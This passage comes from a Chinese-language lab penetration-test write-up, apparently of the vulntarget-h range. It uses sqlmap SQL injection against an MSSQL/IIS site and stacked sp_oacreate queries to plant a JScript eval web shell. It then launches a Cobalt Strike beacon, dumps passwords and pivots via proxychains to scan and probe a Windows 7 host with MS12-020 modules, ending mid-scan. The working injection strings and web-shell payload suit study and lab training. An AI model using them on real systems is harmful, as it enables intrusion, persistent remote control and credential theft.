class="string">&#x27;]_____ ___ ___  &#123;1.6.6#stable&#125;                                                                                                                    </span></span><br><span class="line"><span class="string">|_ -| . [&#x27;</span>]     | .<span class="string">&#x27;| . |                                                                                                                                   </span></span><br><span class="line"><span class="string">|___|_  [&#x27;</span>]_|_|_|__,|  _|                                                                                                                                   </span><br><span class="line">      |_|V...       |_|   https://sqlmap.org                                                                                                                </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 06:05:41 /2022-06-30/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[06:05:42] [INFO] resuming back-end DBMS &#x27;</span>microsoft sql server<span class="string">&#x27; </span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">[06:09:00] [CRITICAL] connection timed out to the target URL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 06:09:00 /2022-06-30/</span></span><br></pre></td></tr></table></figure><h4 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h4><blockquote><ul><li>自动化不能使用只能靠手动了。利用<code>--sql-shell</code>是执行数据库语句。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sqlmap <span class="string">&quot;http://192.168.1.99?user_id=1&quot;</span>  --sql-shell</span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                </span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.6.6<span class="comment">#stable&#125;                                                                                                                    </span></span><br><span class="line">|_ -| . [(]     | .<span class="string">&#x27;| . |                                                                                                                                   </span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|                                                                                                                                   </span></span><br><span class="line"><span class="string">      |_|V...       |_|   https://sqlmap.org                                                                                                                </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 06:44:35 /2022-06-30/</span><br><span class="line">...</span><br><span class="line">[06:44:35] [INFO] the back-end DBMS is Microsoft SQL Server</span><br><span class="line">web server operating system: Windows 7 or 2008 R2</span><br><span class="line">web application technology: ASP.NET 2.0.50727, Microsoft IIS 7.5, ASP.NET</span><br><span class="line">back-end DBMS: Microsoft SQL Server 2008</span><br><span class="line">[06:44:35] [INFO] calling Microsoft SQL Server shell. To quit <span class="built_in">type</span> <span class="string">&#x27;x&#x27;</span> or <span class="string">&#x27;q&#x27;</span> and press ENTER</span><br><span class="line">sql-shell&gt; </span><br></pre></td></tr></table></figure><h5 id="找出网站根目录。"><a href="#找出网站根目录。" class="headerlink" title="找出网站根目录。"></a>找出网站根目录。</h5><ul><li>首先要开启sp_oacareate这个存储过程。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sql-shell&gt; <span class="built_in">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, 1;RECONFIGURE;</span><br><span class="line">[09:26:05] [INFO] executing SQL data execution statement: <span class="string">&#x27;exec sp_configure &#x27;</span>show advanced options<span class="string">&#x27;, 1;RECONFIGURE&#x27;</span></span><br><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, 1;RECONFIGURE: <span class="string">&#x27;NULL&#x27;</span></span><br><span class="line">sql-shell&gt; <span class="built_in">exec</span> sp_configure <span class="string">&#x27;Ole Automation Procedures&#x27;</span>,1;RECONFIGURE;</span><br><span class="line">[09:26:11] [INFO] executing SQL data execution statement: <span class="string">&#x27;exec sp_configure &#x27;</span>Ole Automation Procedures<span class="string">&#x27;,1;RECONFIGURE&#x27;</span></span><br><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">&#x27;Ole Automation Procedures&#x27;</span>,1;RECONFIGURE: <span class="string">&#x27;NULL&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><p>先创建一个tmp表然后将xp_dirtree的结果输出到tmp中。</p></li><li><p>添加数据到tmp表中。这里我们先从IIS默认路径开始。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE tmp (<span class="built_in">dir</span> varchar(8000),num int,num1 int);</span><br><span class="line">insert into tmp(<span class="built_in">dir</span>,num,num1) execute master..xp_dirtree <span class="string">&#x27;c:\inetpub\&#x27;</span>,1,1;</span><br></pre></td></tr></table></figure><p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-06-30_10-06-00.png" alt="Screenshot_2022-06-30_10-06-00.png"></p><ul><li>使用<code>sqlmap</code>查看刚才插入的数据。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sqlmap <span class="string">&quot;http://192.168.1.99?user_id=1&quot;</span> -D <span class="string">&quot;FoundStone_Bank&quot;</span> -T <span class="string">&quot;tmp&quot;</span> -C <span class="string">&quot;dir&quot;</span> --dump --flush-session</span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                </span><br><span class="line"> ___ ___[<span class="string">&#x27;]_____ ___ ___  &#123;1.6.6#stable&#125;                                                                                                                    </span></span><br><span class="line"><span class="string">|_ -| . [,]     | .&#x27;</span>| . |                                                                                                                                   </span><br><span class="line">|___|_  [(]_|_|_|__,|  _|                                                                                                                                   </span><br><span class="line">      |_|V...       |_|   https://sqlmap.org                                                                                                                </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 10:10:47 /2022-06-30/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[10:10:47] [INFO] flushing session file</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">Database: FoundStone_Bank</span></span><br><span class="line"><span class="string">Table: tmp</span></span><br><span class="line"><span class="string">[6 entries]</span></span><br><span class="line"><span class="string">+----------------+</span></span><br><span class="line"><span class="string">| dir            |</span></span><br><span class="line"><span class="string">+----------------+</span></span><br><span class="line"><span class="string">| custerr        |</span></span><br><span class="line"><span class="string">| edrfgyhujikopl |</span></span><br><span class="line"><span class="string">| history        |</span></span><br><span class="line"><span class="string">| logs           |</span></span><br><span class="line"><span class="string">| temp           |</span></span><br><span class="line"><span class="string">| wwwroot        |</span></span><br><span class="line"><span class="string">+----------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[10:11:27] [INFO] table &#x27;</span>FoundStone_Bank.dbo.tmp<span class="string">&#x27; dumped to CSV file &#x27;</span>/home/kali/.local/share/sqlmap/output/192.168.1.99/dump/FoundStone_Bank/tmp.csv<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:11:27] [WARNING] HTTP error codes detected during run:</span></span><br><span class="line"><span class="string">500 (Internal Server Error) - 61 times</span></span><br><span class="line"><span class="string">[10:11:27] [INFO] fetched data logged to text files under &#x27;</span>/home/kali/.local/share/sqlmap/output/192.168.1.99<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 10:11:27 /2022-06-30/</span></span><br></pre></td></tr></table></figure><h5 id="将shell写入网站根目录。"><a href="#将shell写入网站根目录。" class="headerlink" title="将shell写入网站根目录。"></a>将shell写入网站根目录。</h5><ul><li>从上面的结果发现有一个比较特别的目录。接下来我们尝试在该目录写入shell。这里我们先做一下免杀防止被删除，我就不把免杀的shell放出来了。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.99/index.aspx?user_id=1;</span><br><span class="line"><span class="built_in">declare</span> @f int,@g int;</span><br><span class="line"><span class="built_in">exec</span> sp_oacreate <span class="string">&#x27;Scripting.FileSystemObject&#x27;</span>,@f output;</span><br><span class="line">EXEC SP_OAMETHOD @f,<span class="string">&#x27;CreateTextFile&#x27;</span>,@f OUTPUT,<span class="string">&#x27;c:\inetpub\edrfgyhujikopl\shell.aspx&#x27;</span>,1;</span><br><span class="line">EXEC sp_oamethod  @f,<span class="string">&#x27;WriteLine&#x27;</span>,null,<span class="string">&#x27;&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%var a = &quot;un&quot;;var b = &quot;safe&quot;;Response.Write(eval(Request.Item[&quot;z&quot;],a%2Bb));%&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><ul><li>使用蚁剑链接上我们刚才上传的shell。</li></ul><p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-06-30_10-29-41.png" alt="Screenshot_2022-06-30_10-29-41.png"></p><h5 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h5><ul><li>使用CS生存木马然后免杀上传的服务器，然后利用<code>sqlps.exe</code>执行命令刚才上传的木马。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.99/?user_id=1;</span><br><span class="line"><span class="built_in">declare</span> @o int;</span><br><span class="line"><span class="built_in">exec</span> sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>,@o out;</span><br><span class="line"><span class="built_in">exec</span> sp_oamethod @o,<span class="string">&#x27;run&#x27;</span>,null,<span class="string">&#x27;sqlps C:\inetpub\edrfgyhujikopl\beacona.exe&#x27;</span>;</span><br></pre></td></tr></table></figure><ul><li>上线成功。</li></ul><p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-01_04-02-11.png" alt="Screenshot_2022-07-01_04-02-11.png"></p><blockquote><p>上面教程参考于：<a href="https://macchiato.ink/web/web_security/mssql_bypass/#0x03-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">MSSQL注入绕过360执行命令</a></p></blockquote><ul><li>抓取Windows Server 2008密码。</li></ul><p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-01_04-07-48.png" alt="Screenshot_2022-07-01_04-07-48.png"></p><ul><li>开启代理移动到Windows 7。</li></ul></blockquote><h3 id="Windows-7"><a href="#Windows-7" class="headerlink" title="Windows 7"></a>Windows 7</h3><blockquote><p>由于本文章头开已经知道Windows 7的IP地址这里我就越过扫描192.168.153.0&#x2F;24这个网段。</p></blockquote><h4 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h4><ul><li>查看Windows 7开放的端口。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ proxychains4 nmap -sV 192.168.153.128              </span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-01 05:56 EDT</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:23869  ...  192.168.153.128:80  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:23869  ...  192.168.153.128:53 &lt;--denied</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:23869  ...  192.168.153.128:1025 &lt;--denied</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:23869  ...  192.168.153.128:5900 &lt;--denied</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:23869  ...  192.168.153.128:554 &lt;--denied</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:23869  ...  192.168.153.128:113 &lt;--denied</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:23869  ...  192.168.153.128:1720 &lt;--denied</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:23869  ...  192.168.153.128:25 &lt;--denied</span><br><span class="line">...</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.153.128</span><br><span class="line">Host is up (1.1s latency).</span><br><span class="line">Not shown: 988 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE SERVICE            VERSION</span><br><span class="line">80/tcp    open  http               Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)</span><br><span class="line">135/tcp   open  msrpc              Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">3389/tcp  open  ssl/ms-wbt-server?</span><br><span class="line">5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">49152/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49158/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">Service Info: Host: WIN-HF4NQED9HKF; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1213.51 seconds</span><br></pre></td></tr></table></figure><ul><li>使用<code>nmap</code>扫描开放端口是否存在漏洞。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ proxychains4 nmap -sV 192.168.153.128 -p80,135,139,445,3389,5357,49152-49158 --script=vuln</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-02 02:13 EDT</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:80  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:445  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:3389  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:135  ...  OK</span><br><span class="line">...</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.153.128</span><br><span class="line">Host is up (1.6s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE  SERVICE        VERSION</span><br><span class="line">80/tcp    open   http           Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span><br><span class="line">|_http-trace: TRACE is enabled</span><br><span class="line">|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">135/tcp   open   msrpc?</span></span><br><span class="line"><span class="string">139/tcp   open   netbios-ssn?</span></span><br><span class="line"><span class="string">445/tcp   open   microsoft-ds?</span></span><br><span class="line"><span class="string">3389/tcp  open   ms-wbt-server?</span></span><br><span class="line"><span class="string">| rdp-vuln-ms12-020: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2012-0152</span></span><br><span class="line"><span class="string">|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)</span></span><br><span class="line"><span class="string">|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.</span></span><br><span class="line"><span class="string">|           </span></span><br><span class="line"><span class="string">|     Disclosure date: 2012-03-13</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152</span></span><br><span class="line"><span class="string">|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020</span></span><br><span class="line"><span class="string">|   </span></span><br><span class="line"><span class="string">|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2012-0002</span></span><br><span class="line"><span class="string">|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)</span></span><br><span class="line"><span class="string">|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.</span></span><br><span class="line"><span class="string">|           </span></span><br><span class="line"><span class="string">|     Disclosure date: 2012-03-13</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002</span></span><br><span class="line"><span class="string">|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020</span></span><br><span class="line"><span class="string">|_ssl-ccs-injection: No reply from server (TIMEOUT)</span></span><br><span class="line"><span class="string">5357/tcp  open   wsdapi?</span></span><br><span class="line"><span class="string">49152/tcp open   unknown</span></span><br><span class="line"><span class="string">49153/tcp open   unknown</span></span><br><span class="line"><span class="string">49154/tcp open   unknown</span></span><br><span class="line"><span class="string">49155/tcp open   unknown</span></span><br><span class="line"><span class="string">49156/tcp open   unknown</span></span><br><span class="line"><span class="string">49157/tcp closed unknown</span></span><br><span class="line"><span class="string">49158/tcp open   unknown</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span></span><br><span class="line"><span class="string">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span></span><br><span class="line"><span class="string">|_smb-vuln-ms10-054: false</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 1188.52 seconds</span></span><br></pre></td></tr></table></figure><ul><li>通过上面的返回结果我们可以发现这里和Windows Server 2008有相同的漏洞，接下来我们就使用<code>msfconsole</code>的漏洞利用模块验证是否可以使用。</li></ul><blockquote><p>CVE-2012-0152</p><p>CVE-2012-0002</p><ul><li>这里一共搜索到两个模块。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ proxychains4 msfconsole                                                                   </span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">msf6 &gt; search ms12-020</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                              Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -  ----                                              ---------------  ----    -----  -----------</span><br><span class="line">   0  auxiliary/scanner/rdp/ms12_020_check                               normal  Yes    MS12-020 Microsoft Remote Desktop Checker</span><br><span class="line">   1  auxiliary/dos/windows/rdp/ms12_020_maxchannelids  2012-03-16       normal  No     MS12-020 Microsoft Remote Desktop Use-After-Free DoS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use auxiliary/dos/windows/rdp/ms12_020_maxchannelids</span><br></pre></td></tr></table></figure><p>使用<code>auxiliary/scanner/rdp/ms12_020_check</code>模块。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/rdp/ms12_020_check</span><br><span class="line">msf6 auxiliary(scanner/rdp/ms12_020_check) &gt; <span class="built_in">set</span> rhosts 192.168.153.128</span><br><span class="line">rhosts =&gt; 192.168.153.128</span><br><span class="line">msf6 auxiliary(scanner/rdp/ms12_020_check) &gt; exploit </span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:3389  ...  OK</span><br><span class="line"></span><br><span class="line">[+] 192.168.153.128:3389  - 192.168.153.128:3389 - The target is vulnerable.</span><br><span class="line">[*] 192.168.153.128:3389  - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>这里显示<strong>The target is vulnerable.（目标很脆弱。）</strong>，但是我找到该漏洞的exp并不能对目标造成影响。接下来我们继续尝试另外一个模块。</p><p>使用<code>auxiliary/dos/windows/rdp/ms12_020_maxchannelids</code>模块。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/rdp/ms12_020_check) &gt; use auxiliary/dos/windows/rdp/ms12_020_maxchannelids</span><br><span class="line">msf6 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) &gt; <span class="built_in">set</span> rhosts 192.168.153.128</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">rhosts =&gt; 192.168.153.128</span><br><span class="line">msf6 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) &gt; exploit </span><br><span class="line">[*] Running module against 192.168.153.128</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:3389  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:3389  ...  OK</span><br><span class="line"></span><br><span class="line">[*] 192.168.153.128:3389 - 192.168.153.128:3389 - Sending MS12-020 Microsoft Remote Desktop Use-After-Free DoS</span><br><span class="line">[*] 192.168.153.128:3389 - 192.168.153.128:3389 - 210 bytes sent</span><br><span class="line">[*] 192.168.153.128:3389 - 192.168.153.128:3389 - Checking RDP status...</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:3389  ...  OK</span><br><span class="line">[-] 192.168.153.128:3389 - 192.168.153.128:3389 - RDP Service Unreachable</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>该模块也不能正常运行。接下来只能尝试其他端口。</p></blockquote><ul><li>使用<code>nikto</code>。并没有发现特别的信息。只能用浏览器打开看看能不能找到有用的数据了。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ proxychains4 nikto -host http://192.168.153.128</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:80  ...  OK</span><br><span class="line">+ Target IP:          192.168.153.128</span><br><span class="line">+ Target Hostname:    192.168.153.128</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2022-07-02 